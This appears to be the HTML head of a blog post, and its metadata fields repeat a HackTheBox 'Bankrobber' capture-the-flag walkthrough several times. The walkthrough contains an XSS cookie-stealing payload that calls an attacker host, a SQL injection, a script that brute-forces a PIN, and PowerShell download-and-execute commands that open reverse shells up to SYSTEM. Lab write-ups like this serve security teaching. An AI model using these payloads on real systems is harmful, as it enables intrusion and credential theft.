<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HTB - Bankrobber" /><meta name="author" content="QTranspose" /><meta property="og:locale" content="en_US" /><meta name="description" content="Bankrobber is a vulnerable virtual machine created by Gioo and Cneeliz on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we see that this is a Windows machine running HTTP, SMB and MariaDB services. Note that on both 80/http and 443/https it is Apache instead of IIS. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 $ nmap-default 10.10.10.154 Nmap scan report for 10.10.10.154 Host is up (0.093s latency). Not shown: 996 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4) |_http-title: E-coin 443/tcp open ssl/http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4) |_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4 |_http-title: Bad request! | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql MariaDB (unauthorized) Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1m34s, deviation: 0s, median: -1m35s | smb-security-mode: | account_used: &lt;blank&gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-03-11T06:11:47 |_ start_date: 2021-03-11T06:06:21 For the details of the custom nmap commands, check here. HTTP Directing our browser to the address, we see a page like this. On 443/https we can see the same page, and the ssl certificate does not leak any subdomain information to us. After registering a user and logging in, we get the following page. We input some random values and click the button to see what it does. The following message is displayed. Based on the message, we can assume that there is some kind of user simulation going on. We use the following payload to see if there is an XSS vulnerability. A few minutes later, we get a hit on our http server. It does appear vulnerable to XSS. 1 2 3 4 $ python -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.10.154 - - [11/Mar/2021 02:15:41] code 404, message File not found 10.10.10.154 - - [11/Mar/2021 02:15:41] &quot;GET /lol.jpg HTTP/1.1&quot; 404 - Exploitation XSS Methodologies of exploiting XSS can be found here. We will try to retrieve the admin cookies with the following payload. 1 &lt;img src=x onerror=this.src=&quot;http://10.10.14.7:8000/?c=&quot;+document.cookie&gt; Shortly after sending the payload, we get a hit on our http server. 1 10.10.10.154 - - [11/Mar/2021 02:19:42] &quot;GET /?c=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1&quot; 200 - By decoding the values, we get the creadentials admin:Hopelessromantic. Enumeration Admin Panel After logging in with the credentials, we see an admin page. At the bottom of the page, there is a block that seems to execute commands. We try to execute dir as specified, but get the following error message. It seems that this function can only be used locally. Another interesting feature on this page is searching users. It seems retrieving data from the database service. We use a quote to see if it handles bad characters properly, and get an error as the following. We then add -- - to comment out anything afterwards, and it works. There seems to be an SQLi vulnerability. Exploitation SQL Injection After playing with the SQLi, we find that it is union injectable, and there are 3 columns returned. We can control the first two columns and see the values returned. By using the following payload, we can read the source code of backdoorchecker.php. 1 term=1&#39; union select 1,load_file(&#39;c:\\xampp\\htdocs\\admin\\backdoorchecker.php&#39;),3-- - The source code is shown below. Reading through it, we can see that the prohibited bad characters only include $( and &amp;, which makes it possible to inject command via |. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 &lt;?php include(&#39;../link.php&#39;); include(&#39;auth.php&#39;); $username = base64_decode(urldecode($_COOKIE[&#39;username&#39;])); $password = base64_decode(urldecode($_COOKIE[&#39;password&#39;])); $bad = array(&#39;$(&#39;,&#39;&amp;&#39;); $good = &quot;ls&quot;; if(strtolower(substr(PHP_OS,0,3)) == &quot;win&quot;){ $good = &quot;dir&quot;; } if($username == &quot;admin&quot; &amp;&amp; $password == &quot;Hopelessromantic&quot;){ if(isset($_POST[&#39;cmd&#39;])){ // FILTER ESCAPE CHARS foreach($bad as $char){ if(strpos($_POST[&#39;cmd&#39;],$char) !== false){ die(&quot;You&#39;re not allowed to do that.&quot;); } } // CHECK IF THE FIRST 2 CHARS ARE LS if(substr($_POST[&#39;cmd&#39;], 0,strlen($good)) != $good){ die(&quot;It&#39;s only allowed to use the $good command&quot;); } if($_SERVER[&#39;REMOTE_ADDR&#39;] == &quot;::1&quot;){ system($_POST[&#39;cmd&#39;]); } else{ echo &quot;It&#39;s only allowed to access this function from localhost (::1).&lt;br&gt; This is due to the recent hack attempts on our server.&quot;; } } } else{ echo &quot;You are not allowed to use this function!&quot;; } ?&gt; But before doing that, we have to find a way to achieve SSRF, since this function is only allowed locally. XSS to SSRF We can trick the server to send a request to itself to execute commands via the command injection we have identified previously in the source code. To achieve this, we first create a javascript file named rev.js in our http server directory. 1 2 3 4 5 6 var request = new XMLHttpRequest(); var url = &quot;http://localhost/admin/backdoorchecker.php&quot;; var params = &quot;cmd=dir | powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.7:8000/rev.ps1&#39;)&quot;; request.open(&quot;POST&quot;, url); request.setRequestHeader(&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;); request.send(params); We also put our reverse shell script rev.ps1 from nishang to the same directory. Next, we use the following XSS payload to make the server execute our rev.js. 1 &lt;script src=&quot;http://10.10.14.7:8000/rev.js&quot;&gt;&lt;/script&gt; Shortly, we get a reverse shell. 1 2 3 4 5 6 $ rlwrap ncat -nlvp 4444 ... PS C:\xampp\htdocs\admin&gt; whoami bankrobber\cortin Privilege Escalation Checking listening ports with netstat, we find a new port 910 which is not shown in our nmap scan. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 PS C:\xampp\htdocs\admin&gt; netstat -ano | findstr LISTEN TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 2512 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 756 TCP 0.0.0.0:443 0.0.0.0:0 LISTENING 2512 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:910 0.0.0.0:0 LISTENING 1592 TCP 0.0.0.0:3306 0.0.0.0:0 LISTENING 2868 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 468 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 904 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 884 TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 1456 TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING 596 TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING 604 TCP 10.10.10.154:139 0.0.0.0:0 LISTENING 4 TCP [::]:80 [::]:0 LISTENING 2512 TCP [::]:135 [::]:0 LISTENING 756 TCP [::]:443 [::]:0 LISTENING 2512 TCP [::]:445 [::]:0 LISTENING 4 TCP [::]:3306 [::]:0 LISTENING 2868 TCP [::]:49664 [::]:0 LISTENING 468 TCP [::]:49665 [::]:0 LISTENING 904 TCP [::]:49666 [::]:0 LISTENING 884 TCP [::]:49667 [::]:0 LISTENING 1456 TCP [::]:49668 [::]:0 LISTENING 596 TCP [::]:49669 [::]:0 LISTENING 604 To play with the service, we will forward the port to us with chisel. First, we set up chisel server on our kali box. 1 $ ./chisel server -p 8888 --reverse Next, we send the Windows version of chisel to the target and forward the port to 9100 on our kali box. 1 2 3 PS C:\xampp\htdocs\admin&gt; iwr http://10.10.14.7:8000/chisel.exe -outfile \windows\temp\chisel.exe PS C:\xampp\htdocs\admin&gt; \windows\temp\chisel.exe client 10.10.14.7:8888 R:9100:127.0.0.1:910 Now that the port is forwarded, we can connect to it with ncat to see what it does. The program asks for a PIN code. Trying a random number, we get no luck. 1 2 3 4 5 6 7 8 9 10 11 $ ncat -nv 127.0.0.1 9100 Ncat: Version 7.91 ( https://nmap.org/ncat ) Ncat: Connected to 127.0.0.1:9100. -------------------------------------------------------------- Internet E-Coin Transfer System International Bank of Sun church v0.1 by Gio &amp; Cneeliz -------------------------------------------------------------- Please enter your super secret 4 digit PIN code to login: [$] 1337 [!] Access denied, disconnecting client.... Since the PIN code is a 4-digit number, we can easily brute force it. To do this, we write a python script that supports multi-threading and uses pwntools to handle data. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from pwn import * from concurrent.futures import ThreadPoolExecutor finished = False def try_pin(pin): global finished if not finished: r = remote(&quot;127.0.0.1&quot;, 9100, level=&quot;error&quot;) r.recvuntil(&quot;[$] &quot;) r.sendline(pin) response = r.recvline() r.close() if b&quot;denied&quot; not in response: log.success(f&quot;Success: {pin}&quot;) finished = True with ThreadPoolExecutor(max_workers=30) as executor: for i in range(9999): pin = str(i).zfill(4) executor.submit(try_pin, pin) After running the script, we get a valid PIN code. 1 2 $ python3 brute.py [+] Success: 0021 With the PIN code, we can let the program continue. It then asks for another input and execute some command. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ ncat -nv 127.0.0.1 9100 Ncat: Version 7.91 ( https://nmap.org/ncat ) Ncat: Connected to 127.0.0.1:9100. -------------------------------------------------------------- Internet E-Coin Transfer System International Bank of Sun church v0.1 by Gio &amp; Cneeliz -------------------------------------------------------------- Please enter your super secret 4 digit PIN code to login: [$] 0021 [$] PIN is correct, access granted! -------------------------------------------------------------- Please enter the amount of e-coins you would like to transfer: [$] 1 [$] Transfering $1 using our e-coin transfer application. [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe [$] Transaction in progress, you can safely disconnect... We try to fuzz it with a bunch of As, and we find that we have successfully overwritten the command executed. 1 [$] Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA To find out the position of the command in our payload, we generate a pattern string with msf-pattern_create. 1 2 $ msf-pattern_create -l 100 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Using the pattern string instead of As, we get the following results. 1 [$] Executing e-coin transfer tool: 0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Searching the above part in our pattern string, we find that it begins at the 32nd character. 1 2 $ msf-pattern_offset -l 100 -q 0Ab1 [*] Exact match at offset 32 Knowing the offset, we are now able to craft a payload to precisely overwrite the command. 1 2 $ python3 -c &quot;print(&#39;A&#39;*32 + &#39;powershell iex(new-object net.webclient).downloadstring(\&#39;http://10.10.14.7:8000/rev.ps1\&#39;)&#39;)&quot; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApowershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.7:8000/rev.ps1&#39;) We connect to the program again and paste our payload when asked for the input. It seems that the program is executing our command. 1 [$] Executing e-coin transfer tool: powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.7:8000/rev.ps1&#39;) Checking our ncat listener, we get a reverse shell with system privileges. 1 2 3 4 5 6 $ rlwrap ncat -nlvp 4444 ... PS C:\Windows\system32&gt; whoami nt authority\system" /><meta property="og:description" content="Bankrobber is a vulnerable virtual machine created by Gioo and Cneeliz on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we see that this is a Windows machine running HTTP, SMB and MariaDB services. Note that on both 80/http and 443/https it is Apache instead of IIS. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 $ nmap-default 10.10.10.154 Nmap scan report for 10.10.10.154 Host is up (0.093s latency). Not shown: 996 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4) |_http-title: E-coin 443/tcp open ssl/http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4) |_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4 |_http-title: Bad request! | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql MariaDB (unauthorized) Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1m34s, deviation: 0s, median: -1m35s | smb-security-mode: | account_used: &lt;blank&gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-03-11T06:11:47 |_ start_date: 2021-03-11T06:06:21 For the details of the custom nmap commands, check here. HTTP Directing our browser to the address, we see a page like this. On 443/https we can see the same page, and the ssl certificate does not leak any subdomain information to us. After registering a user and logging in, we get the following page. We input some random values and click the button to see what it does. The following message is displayed. Based on the message, we can assume that there is some kind of user simulation going on. We use the following payload to see if there is an XSS vulnerability. A few minutes later, we get a hit on our http server. It does appear vulnerable to XSS. 1 2 3 4 $ python -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.10.154 - - [11/Mar/2021 02:15:41] code 404, message File not found 10.10.10.154 - - [11/Mar/2021 02:15:41] &quot;GET /lol.jpg HTTP/1.1&quot; 404 - Exploitation XSS Methodologies of exploiting XSS can be found here. We will try to retrieve the admin cookies with the following payload. 1 &lt;img src=x onerror=this.src=&quot;http://10.10.14.7:8000/?c=&quot;+document.cookie&gt; Shortly after sending the payload, we get a hit on our http server. 1 10.10.10.154 - - [11/Mar/2021 02:19:42] &quot;GET /?c=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1&quot; 200 - By decoding the values, we get the creadentials admin:Hopelessromantic. Enumeration Admin Panel After logging in with the credentials, we see an admin page. At the bottom of the page, there is a block that seems to execute commands. We try to execute dir as specified, but get the following error message. It seems that this function can only be used locally. Another interesting feature on this page is searching users. It seems retrieving data from the database service. We use a quote to see if it handles bad characters properly, and get an error as the following. We then add -- - to comment out anything afterwards, and it works. There seems to be an SQLi vulnerability. Exploitation SQL Injection After playing with the SQLi, we find that it is union injectable, and there are 3 columns returned. We can control the first two columns and see the values returned. By using the following payload, we can read the source code of backdoorchecker.php. 1 term=1&#39; union select 1,load_file(&#39;c:\\xampp\\htdocs\\admin\\backdoorchecker.php&#39;),3-- - The source code is shown below. Reading through it, we can see that the prohibited bad characters only include $( and &amp;, which makes it possible to inject command via |. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 &lt;?php include(&#39;../link.php&#39;); include(&#39;auth.php&#39;); $username = base64_decode(urldecode($_COOKIE[&#39;username&#39;])); $password = base64_decode(urldecode($_COOKIE[&#39;password&#39;])); $bad = array(&#39;$(&#39;,&#39;&amp;&#39;); $good = &quot;ls&quot;; if(strtolower(substr(PHP_OS,0,3)) == &quot;win&quot;){ $good = &quot;dir&quot;; } if($username == &quot;admin&quot; &amp;&amp; $password == &quot;Hopelessromantic&quot;){ if(isset($_POST[&#39;cmd&#39;])){ // FILTER ESCAPE CHARS foreach($bad as $char){ if(strpos($_POST[&#39;cmd&#39;],$char) !== false){ die(&quot;You&#39;re not allowed to do that.&quot;); } } // CHECK IF THE FIRST 2 CHARS ARE LS if(substr($_POST[&#39;cmd&#39;], 0,strlen($good)) != $good){ die(&quot;It&#39;s only allowed to use the $good command&quot;); } if($_SERVER[&#39;REMOTE_ADDR&#39;] == &quot;::1&quot;){ system($_POST[&#39;cmd&#39;]); } else{ echo &quot;It&#39;s only allowed to access this function from localhost (::1).&lt;br&gt; This is due to the recent hack attempts on our server.&quot;; } } } else{ echo &quot;You are not allowed to use this function!&quot;; } ?&gt; But before doing that, we have to find a way to achieve SSRF, since this function is only allowed locally. XSS to SSRF We can trick the server to send a request to itself to execute commands via the command injection we have identified previously in the source code. To achieve this, we first create a javascript file named rev.js in our http server directory. 1 2 3 4 5 6 var request = new XMLHttpRequest(); var url = &quot;http://localhost/admin/backdoorchecker.php&quot;; var params = &quot;cmd=dir | powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.7:8000/rev.ps1&#39;)&quot;; request.open(&quot;POST&quot;, url); request.setRequestHeader(&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;); request.send(params); We also put our reverse shell script rev.ps1 from nishang to the same directory. Next, we use the following XSS payload to make the server execute our rev.js. 1 &lt;script src=&quot;http://10.10.14.7:8000/rev.js&quot;&gt;&lt;/script&gt; Shortly, we get a reverse shell. 1 2 3 4 5 6 $ rlwrap ncat -nlvp 4444 ... PS C:\xampp\htdocs\admin&gt; whoami bankrobber\cortin Privilege Escalation Checking listening ports with netstat, we find a new port 910 which is not shown in our nmap scan. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 PS C:\xampp\htdocs\admin&gt; netstat -ano | findstr LISTEN TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 2512 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 756 TCP 0.0.0.0:443 0.0.0.0:0 LISTENING 2512 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:910 0.0.0.0:0 LISTENING 1592 TCP 0.0.0.0:3306 0.0.0.0:0 LISTENING 2868 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 468 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 904 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 884 TCP 0.0.0.0:49667 0.0.0.0:0 LISTENING 1456 TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING 596 TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING 604 TCP 10.10.10.154:139 0.0.0.0:0 LISTENING 4 TCP [::]:80 [::]:0 LISTENING 2512 TCP [::]:135 [::]:0 LISTENING 756 TCP [::]:443 [::]:0 LISTENING 2512 TCP [::]:445 [::]:0 LISTENING 4 TCP [::]:3306 [::]:0 LISTENING 2868 TCP [::]:49664 [::]:0 LISTENING 468 TCP [::]:49665 [::]:0 LISTENING 904 TCP [::]:49666 [::]:0 LISTENING 884 TCP [::]:49667 [::]:0 LISTENING 1456 TCP [::]:49668 [::]:0 LISTENING 596 TCP [::]:49669 [::]:0 LISTENING 604 To play with the service, we will forward the port to us with chisel. First, we set up chisel server on our kali box. 1 $ ./chisel server -p 8888 --reverse Next, we send the Windows version of chisel to the target and forward the port to 9100 on our kali box. 1 2 3 PS C:\xampp\htdocs\admin&gt; iwr http://10.10.14.7:8000/chisel.exe -outfile \windows\temp\chisel.exe PS C:\xampp\htdocs\admin&gt; \windows\temp\chisel.exe client 10.10.14.7:8888 R:9100:127.0.0.1:910 Now that the port is forwarded, we can connect to it with ncat to see what it does. The program asks for a PIN code. Trying a random number, we get no luck. 1 2 3 4 5 6 7 8 9 10 11 $ ncat -nv 127.0.0.1 9100 Ncat: Version 7.91 ( https://nmap.org/ncat ) Ncat: Connected to 127.0.0.1:9100. -------------------------------------------------------------- Internet E-Coin Transfer System International Bank of Sun church v0.1 by Gio &amp; Cneeliz -------------------------------------------------------------- Please enter your super secret 4 digit PIN code to login: [$] 1337 [!] Access denied, disconnecting client.... Since the PIN code is a 4-digit number, we can easily brute force it. To do this, we write a python script that supports multi-threading and uses pwntools to handle data. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from pwn import * from concurrent.futures import ThreadPoolExecutor finished = False def try_pin(pin): global finished if not finished: r = remote(&quot;127.0.0.1&quot;, 9100, level=&quot;error&quot;) r.recvuntil(&quot;[$] &quot;) r.sendline(pin) response = r.recvline() r.close() if b&quot;denied&quot; not in response: log.success(f&quot;Success: {pin}&quot;) finished = True with ThreadPoolExecutor(max_workers=30) as executor: for i in range(9999): pin = str(i).zfill(4) executor.submit(try_pin, pin) After running the script, we get a valid PIN code. 1 2 $ python3 brute.py [+] Success: 0021 With the PIN code, we can let the program continue. It then asks for another input and execute some command. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ ncat -nv 127.0.0.1 9100 Ncat: Version 7.91 ( https://nmap.org/ncat ) Ncat: Connected to 127.0.0.1:9100. -------------------------------------------------------------- Internet E-Coin Transfer System International Bank of Sun church v0.1 by Gio &amp; Cneeliz -------------------------------------------------------------- Please enter your super secret 4 digit PIN code to login: [$] 0021 [$] PIN is correct, access granted! -------------------------------------------------------------- Please enter the amount of e-coins you would like to transfer: [$] 1 [$] Transfering $1 using our e-coin transfer application. [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe [$] Transaction in progress, you can safely disconnect... We try to fuzz it with a bunch of As, and we find that we have successfully overwritten the command executed. 1 [$] Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA To find out the position of the command in our payload, we generate a pattern string with msf-pattern_create. 1 2 $ msf-pattern_create -l 100 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Using the pattern string instead of As, we get the following results. 1 [$] Executing e-coin transfer tool: 0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Searching the above part in our pattern string, we find that it begins at the 32nd character. 1 2 $ msf-pattern_offset -l 100 -q 0Ab1 [*] Exact match at offset 32 Knowing the offset, we are now able to craft a payload to precisely overwrite the command. 1 2 $ python3 -c &quot;print(&#39;A&#39;*32 + &#39;powershell iex(new-object net.webclient).downloadstring(\&#39;http://10.10.14.7:8000/rev.ps1\&#39;)&#39;)&quot; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApowershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.7:8000/rev.ps1&#39;) We connect to the program again and paste our payload when asked for the input. It seems that the program is executing our command. 1 [$] Executing e-coin transfer tool: powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.7:8000/rev.ps1&#39;) Checking our ncat listener, we get a reverse shell with system privileges. 1 2 3 4 5 6 $ rlwrap ncat -nlvp 4444 ... PS C:\Windows\system32&gt; whoami nt authority\system" /><link rel="canonical" href="https://qtranspose.xyz/posts/htb-bankrobber/" /><meta property="og:url" content="https://qtranspose.xyz/posts/htb-bankrobber/" /><meta property="og:site_name" content="QTranspose" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-03-11T00:00:00+11:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HTB - Bankrobber" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@QTranspose" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Bankrobber is a vulnerable virtual machine created by Gioo and Cneeliz on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we see that this is a Windows machine running HTTP, SMB and MariaDB services. Note that on both 80/http and 443/https it is Apache instead of IIS. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 $ nmap-default 10.10.10.154 Nmap scan report for 10.10.10.154 Host is up (0.093s latency). Not shown: 996 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4) |_http-title: E-coin 443/tcp open ssl/http Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4) |_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4 |_http-title: Bad request! | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql MariaDB (unauthorized) Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1m34s, deviation: 0s, median: -1m35s | smb-security-mode: | account_used: &lt;blank&gt; | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-03-11T06:11:47 |_ start_date: 2021-03-11T06:06:21 For the details of the custom nmap commands, check here. HTTP Directing our browser to the address, we see a page like this. On 443/https we can see the same page, and the ssl certificate does not leak any subdomain information to us. After registering a user and logging in, we get the following page. We input some random values and click the button to see what it does. The following message is displayed. Based on the message, we can assume that there is some kind of user simulation going on. We use the following payload to see if there is an XSS vulnerability. A few minutes later, we get a hit on our http server. It does appear vulnerable to XSS. 1 2 3 4 $ python -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.10.154 - - [11/Mar/2021 02:15:41] code 404, message File not found 10.10.10.154 - - [11/Mar/2021 02:15:41] &quot;GET /lol.jpg HTTP/1.1&quot; 404 - Exploitation XSS Methodologies of exploiting XSS can be found here. We will try to retrieve the admin cookies with the following payload. 1 &lt;img src=x onerror=this.src=&quot;http://10.10.14.7:8000/?c=&quot;+document.cookie&gt; Shortly after sending the payload, we get a hit on our http server. 1 10.10.10.154 - - [11/Mar/2021 02:19:42] &quot;GET /?c=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1&quot; 200 - By decoding the values, we get the creadentials admin:Hopelessromantic. Enumeration Admin Panel After logging in with the credentials, we see an admin page. At the bottom of the page, there is a block that seems to execute commands. We try to execute dir as specified, but get the following error message. It seems that this function can only be used locally. Another interesting feature on this page is searching users. It seems retrieving data from the database service. We use a quote to see if it handles bad characters properly, and get an error as the following. We then add -- - to comment out anything afterwards, and it works. There seems to be an SQLi vulnerability. Exploitation SQL Injection After playing with the SQLi, we find that it is union injectable, and there are 3 columns returned. We can control the first two columns and see the values returned. By using the following payload, we can read the source code of backdoorchecker.php. 1 term=1&#39; union select 1,load_file(&#39;c:\\\\xampp\\\\htdocs\\\\admin\\\\backdoorchecker.php&#39;),3-- - The source code is shown below. Reading through it, we can see that the prohibited bad characters only include $( and &amp;, which makes it possible to inject command via |. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 &lt;?php include(&#39;../link.php&#39;); include(&#39;auth.php&#39;); $username = base64_decode(urldecode($_COOKIE[&#39;username&#39;])); $password = base64_decode(urldecode($_COOKIE[&#39;password&#39;])); $bad = array(&#39;$(&#39;,&#39;&amp;&#39;); $good = &quot;ls&quot;; if(strtolower(substr(PHP_OS,0,3)) == &quot;win&quot;){ $good = &quot;dir&quot;; } if($username == &quot;admin&quot; &amp;&amp; $password == &quot;Hopelessromantic&quot;){ if(isset($_POST[&#39;cmd&#39;])){ // FILTER ESCAPE CHARS foreach($bad as $char){ if(strpos($_POST[&#39;cmd&#39;],$char) !== false){ die(&quot;You&#39;re not allowed to do that.&quot;); } } // CHECK IF THE FIRST 2 CHARS ARE LS if(substr($_POST[&#39;cmd&#39;], 0,strlen($good)) != $good){ die(&quot;It&#39;s only allowed to use the $good command&quot;); } if($_SERVER[&#39;REMOTE_ADDR&#39;] == &quot;::1&quot;){ system($_POST[&#39;cmd&#39;]); } else{ echo &quot;It&#39;s only allowed to access this function from localhost (::1).&lt;br&gt; This is due to the recent hack attempts on our server.&quot;; } } } else{ echo &quot;You are not allowed to use this function!&quot;; } ?&gt; But before doing that, we have to find a way to achieve SSRF, since this function is only allowed locally. XSS to SSRF We can trick the server to send a request to itself to execute commands via the command injection we have identified previously in the source code. To achieve this, we first create a javascript file named rev.js in our http server directory. 1 2 3 4 5 6 var request = new XMLHttpRequest(); var url = &quot;http://localhost/admin/backdoorchecker.php&quot;; var params = &quot;cmd=dir | powershell iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.7:8000/rev.ps1&#39;)&quot;; request.open(&quot;POST&quot;, url); request.setRequestHeader(&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;); request.send(params); We also put our reverse shell script rev.ps1 from nishang to the same directory. Next, we use the following XSS payload to make the server execute our rev.js. 1 &lt;script src=&quot;http://10.10.14.7:8000/rev.js&quot;&gt;&lt;/script&gt; Shortly, we get a reverse shell. 1 2 3 4 5 6 $ rlwrap ncat -nlvp 4444 ... PS C:\\xampp\\htdocs\\admin&gt; whoami bankrobber\\cortin Privilege Escalation Checking listening ports with netstat, we find a new port 910 which is not shown in our nmap scan. 1 